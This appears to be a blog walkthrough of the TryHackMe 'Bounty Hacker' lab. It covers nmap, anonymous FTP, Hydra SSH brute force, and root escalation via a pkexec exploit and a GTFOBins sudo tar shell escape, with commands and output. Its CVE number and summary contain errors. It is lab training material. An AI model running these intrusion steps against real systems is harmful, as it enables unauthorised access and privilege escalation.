---
title: Bounty Hacker - TryHackMe
date: 2022-09-04 14:42:24 +0800
categories: [Blogging, TryHackme]
tags: [walkthrough]     # TAG names should always be lowercase
pin: true
---
	



You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!
**Bounty Hacker** is a room in <a href="www.TryHackme.com">TryHackMe</a>. In this article you will learn 
how to exploit the **sudo** misconfiguration when there is a password reusable vulnerability in the target machine.

![Room Description](/assets/pictures/Description.png)
_Room Description_

Let's do this...

## Nmap
First of all I love to start by conducting an <code style="color: green">Nmap</code> scan on the target.


```console
$ nmap -sV -p- -vv -oN nmap {Target_IP}
Initiating Connect Scan at 15:13
Scanning 10.10.181.69 [65535 ports]
Discovered open port 80/tcp on 10.10.181.69
Discovered open port 21/tcp on 10.10.181.69
Discovered open port 22/tcp on 10.10.181.69

```
## Port 80
First Let's start with **port 80**. 

![port 80 web](/assets/pictures/TargetPort80.png)
_Port 80_
Went through the source code and nothing was interesting. 
<br>
<br>
##	 Port 21
File Transfer Protocal Service runs on port 21. The File Transfer Protocol provides a framework to transfer information between two networked computers, much like Hypertext Transfer Protocol does through a web browser.
<br>
I tried to login to this port anonymously and it was successful.

```console
ftp 10.10.195.119
Connected to 10.10.195.119.
220 (vsFTPd 3.0.3)
Name (10.10.149.154:nesh): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```
![Ftp Image](/assets/pictures/ftp.png)
_ftp Service on port 21_
<br>
<br>
I downloaded all the files from this port using the `Mget *` command.
The two texts files were:
<code style="color: green;">Locks.txt</code>
and
<code style="color: green;">task.txt</code>

```console
$ cat task.txt
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```
From the <code style="color: green">task.txt</code> we gather that we have a user whose name is `lin`
<br>
 **Username: lin**
<br>
On the other hand the other file seemed to be a password container. With this file, we could 
perform a password dictionary attack using a tool known as Hydra.  
<br>
Performing the attack on **Port 22** 
## Port 22 
The options we pass into Hydra depends on which service (protocol) we're attacking. For example if we wanted to bruteforce <code style="color: green">SSH</code> with the username being user and a password list being <code style="color: green">locks.txt</code>, we'd use the following command:
```console
hydra -l lin -P /home/nesh/tryhackme/BountyHacker 10.10.195.119  -t 4 ssh
```
![Hydra password Attack](/assets/pictures/hydra.png)
_Hydra Password attack_
```console
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-04 21:23:38
[DATA] max 4 tasks per 1 server, overall 4 tasks, 26 login tries (l:1/p:26), ~7 tries per task
[DATA] attacking ssh://10.10.149.154:22/
[22][ssh] host: 10.10.149.154   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-04 21:23:49
```
**Username: <code style="color: green">lin</code> Password: <code style="color: green">RedDr4gonSynd1cat3</code>**
<br>
Now that we have the needed credentials to ssh to the machine, Let's do it ...

`$ ssh lin@10.10.149.154`

![ssh login](/assets/pictures/ssh.png)
_SSH Login on port 22_
```console
Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
lin@bountyhacker:~/Desktop$ ls
user.txt
lin@bountyhacker:~/Desktop$ cat user.txt 
THM{CR1M3_SyNd1C4T3}
lin@bountyhacker:~/Desktop$ 

```
## Priviledge Escalation
There are two ways to escalate priviledges to root:
<br>
## **Method 1** : Using _Linpeas Script_
 
For PrevEsc I love running <code style="color:green;">linpeas script</code>. To scan for vulnerabilities in 
the target system. 
<br>
I uploaded the linpeas script to my port 80, so that I can go on the target machine to <code style="color: green">/tmp</code> directory and run the script.
<br>
![port 80](/assets/pictures/tun0.png)
_Local host_
<br>

I need to go to the <code style="color: green">/tmp</code> to download the script to the script.
![Linpeas Script](/assets/pictures/linpeas.png)
_Linpeas Script_
It's time to run the script ...
```console
$ ./linpeas.sh
```
![Script](/assets/pictures/script.png)
_Linpeas Script_
Found the target was vulnerable to <code style="color: green">CVE-2020-4034</code>.
<br>
**CVE-2020-4034**
<br>

A local privilege escalation vulnerability was found on polkit's pkexec utility. The pkexec application is a setuid tool designed to allow unprivileged users to run commands as privileged users according predefined policies. The current version of pkexec doesn't handle the calling parameters count correctly and ends trying to execute environment variables as commands. An attacker can leverage this by crafting environment variables in such a way it'll induce pkexec to execute arbitrary code. When successfully executed the attack can cause a local privilege escalation given unprivileged users administrative rights on the target machine. 

<br>
There are two versions of the CVE exploit: `Python3 Exploit` `C language exploit`
I uploaded the CVE exploit to my port 80 and went to the target machine and downloaded it there.
![CVE](/assets/pictures/cve.png)
After running the script I was in root group. And collected the root flag 
`root.txt`
```html
THM{80UN7Y_h4cK3r}
```
![Root](/assets/pictures/root.png)
_Machine Pwned_
## method 2: Using GTFOBINs
GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.

```console
lin@bountyhacker:/tmp$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```
Using the command `$ sudo -l` , we see that the user `lin` can run the <code style="color:green;">/bin/tar</code> command with `root` priviledges.
<br>
Let's see what `GTFOBINS` has for us ...
![GTFOBINS](/assets/pictures/gtf.png)
_GTFOBINS Github_
Now let's run the command on our target..
```console
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
![Gtfobins](/assets/pictures/targtf.png)
![pwned](/assets/pictures/final.png)
_Machine Pwned_
There is need upgrade the shell
```console
$ python3 -c "import pty;pty.spawn('/bin/bash')"
```
And collected the root flag:
```console
$ cat /root/root.txt
THM{80UN7Y_h4cK3r}
```
<br>
## Summary
- From the <code style="color: green;">Nmap</code> scan, we found 3 open ports i.e 
	- <code style="color: green;">Port 21 (ftp)</code>
	- <code style="color: green;">Port 22 (ssh)</code>
	- <code style="color: green;">Port 80 (http)</code>
- Port 22 allowed <code style="color: green;">anonymous</code> login. After the succesful login I found 2 files on the ftp server. <code style="color: green;">locks.txt</code>, <code style="color: green;">note.txt</code>. After I opened <code style="color: green;">note.txt</code> I found Username <code style="color: green;">lin</code> and on the other file I found some password stored iin the file.
- I used <code style="color: green;">locks.txt</code> as my dictionary to Bruteforce the <code style="color: green;">ssh login</code> using a tool known as <code style="color: green;">hydra</code>.
- I found `lin's password` and used that to login to the machine using <code style="color: green;">ssh</code>. 
- I found that I could escalate my previledges using 2 methods: 
	- <code style="color: green;">Linpeas script</code>
	- <code style="color: green;">GTFOBINS Github</code>
- With this 2 methods I `Pwned the machine`
<br>
<br>

It was indeed a lot of fun. I hope you enjoyed reading through it. 
<iframe src="https://giphy.com/embed/d68IdpvmAHohx5NMEV" width="480" height="344" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/moodman-thank-you-thankyou-d68IdpvmAHohx5NMEV"></a></p>